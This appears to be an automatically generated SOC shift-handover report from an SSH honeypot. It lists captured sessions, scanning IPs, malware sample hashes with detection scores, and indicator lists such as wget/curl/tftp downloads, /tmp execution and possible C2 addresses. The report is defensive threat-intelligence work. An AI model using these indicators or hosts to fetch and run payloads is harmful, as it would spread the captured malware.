| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:37` | `cowrie.session.connect` |
| `2026-07-13 06:54:37` | `cowrie.client.version` |
| `2026-07-13 06:54:37` | `cowrie.client.kex` |
| `2026-07-13 06:54:40` | `cowrie.login.success` |
| `2026-07-13 06:54:42` | `cowrie.session.params` |
| `2026-07-13 06:54:42` | `cowrie.command.input` |
| `2026-07-13 06:54:42` | `cowrie.log.closed` |
| `2026-07-13 06:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b35c0694724

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:46` | `cowrie.session.connect` |
| `2026-07-13 06:54:46` | `cowrie.client.version` |
| `2026-07-13 06:54:46` | `cowrie.client.kex` |
| `2026-07-13 06:54:48` | `cowrie.login.success` |
| `2026-07-13 06:54:49` | `cowrie.session.params` |
| `2026-07-13 06:54:49` | `cowrie.command.input` |
| `2026-07-13 06:54:50` | `cowrie.log.closed` |
| `2026-07-13 06:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a78abe9d9559

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:54` | `cowrie.session.connect` |
| `2026-07-13 06:54:55` | `cowrie.client.version` |
| `2026-07-13 06:54:55` | `cowrie.client.kex` |
| `2026-07-13 06:54:56` | `cowrie.login.success` |
| `2026-07-13 06:54:57` | `cowrie.session.params` |
| `2026-07-13 06:54:57` | `cowrie.command.input` |
| `2026-07-13 06:54:57` | `cowrie.log.closed` |
| `2026-07-13 06:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `69.164.207[.]173` | **119** | 2026-07-13 05:32 | 2026-07-13 05:36 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **37** | 2026-07-13 02:56 | 2026-07-13 06:54 | 39m | 0 | `T1592` | 🟠 MEDIUM |
| `72.167.151[.]62` | **24** | 2026-07-13 02:55 | 2026-07-13 06:36 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `103.213.95[.]198` | **9** | 2026-07-13 03:01 | 2026-07-13 06:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **9** | 2026-07-13 03:10 | 2026-07-13 06:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | **3** | 2026-07-13 06:34 | 2026-07-13 06:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.89.162[.]15` | **3** | 2026-07-13 06:43 | 2026-07-13 06:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]240` | **3** | 2026-07-13 03:56 | 2026-07-13 04:17 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]71` | **3** | 2026-07-13 04:44 | 2026-07-13 05:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `172.236.228[.]220` | **2** | 2026-07-13 04:20 | 2026-07-13 04:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]229` | **2** | 2026-07-13 04:57 | 2026-07-13 04:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.242.3[.]14` | **2** | 2026-07-13 02:55 | 2026-07-13 02:55 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `70.166.167[.]35` | **2** | 2026-07-13 03:03 | 2026-07-13 04:47 | 4m | 0 | `T1592` | 🟢 LOW |
| `111.39.167[.]59` | 1 | 2026-07-13 03:29 | 2026-07-13 03:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `115.190.62[.]211` | 1 | 2026-07-13 03:43 | 2026-07-13 03:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-07-13 03:05 | 2026-07-13 03:05 | 4s | 0 | `T1592` | 🟢 LOW |
| `122.186.249[.]6` | 1 | 2026-07-13 05:56 | 2026-07-13 05:56 | 4s | 0 | `T1592` | 🟢 LOW |
| `122.234.111[.]219` | 1 | 2026-07-13 06:53 | 2026-07-13 06:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `124.115.66[.]219` | 1 | 2026-07-13 05:44 | 2026-07-13 05:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `13.140.140[.]94` | 1 | 2026-07-13 05:35 | 2026-07-13 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]56` | 1 | 2026-07-13 06:32 | 2026-07-13 06:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]130` | 1 | 2026-07-13 05:09 | 2026-07-13 05:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | 1 | 2026-07-13 06:18 | 2026-07-13 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.138.158[.]25` | 1 | 2026-07-13 06:11 | 2026-07-13 06:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]253` | 1 | 2026-07-13 05:23 | 2026-07-13 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-07-13 05:34 | 2026-07-13 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-13 06:12 | 2026-07-13 06:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.161.62[.]161` | 1 | 2026-07-13 03:00 | 2026-07-13 03:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.116.35[.]149` | 1 | 2026-07-13 05:10 | 2026-07-13 05:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-07-13 06:33 | 2026-07-13 06:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-13 06:33 | 2026-07-13 06:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]37` | 1 | 2026-07-13 06:34 | 2026-07-13 06:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]2` | 1 | 2026-07-13 05:45 | 2026-07-13 05:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]85` | 1 | 2026-07-13 05:27 | 2026-07-13 05:27 | 4s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-07-13 06:25 | 2026-07-13 06:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]112` | 1 | 2026-07-13 05:23 | 2026-07-13 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]73` | 1 | 2026-07-13 04:18 | 2026-07-13 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]99` | 1 | 2026-07-13 04:18 | 2026-07-13 04:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `83.226.181[.]38` | 1 | 2026-07-13 03:27 | 2026-07-13 03:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.204.153[.]114` | 1 | 2026-07-13 03:35 | 2026-07-13 03:36 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]13` | 1 | 2026-07-13 06:32 | 2026-07-13 06:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]128` | 1 | 2026-07-13 06:34 | 2026-07-13 06:34 | 8s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]10` | 1 | 2026-07-13 06:49 | 2026-07-13 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `97.74.236[.]238` | 1 | 2026-07-13 03:14 | 2026-07-13 03:14 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `196.191.142[.]67` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `83.226.181[.]38` | SE | Telenor Sverige AB | **100** ⚠️ | 30 |
| `194.195.210[.]47` | US | Linode, LLC | **100** ⚠️ | 50 |
| `218.161.62[.]161` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 11 |
| `122.254.30[.]34` | TW | TFN MEDIA CO., LTD. | **100** ⚠️ | 9 |
| `172.236.228[.]229` | US | Linode | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `193.176.31[.]253` | NL | Infrawatch Limited | **100** ⚠️ | 29 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 396 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 374 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 41 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 39 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 39 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 670 cases |
| Tool 34  | Credential Extractor        | ✅ 447 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 20 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 145 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (3.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 80 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 396 priority case(s) shown individually · 44 recon entry/entries in table (13 group(s) consolidating 218 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-13T06:59:03Z_
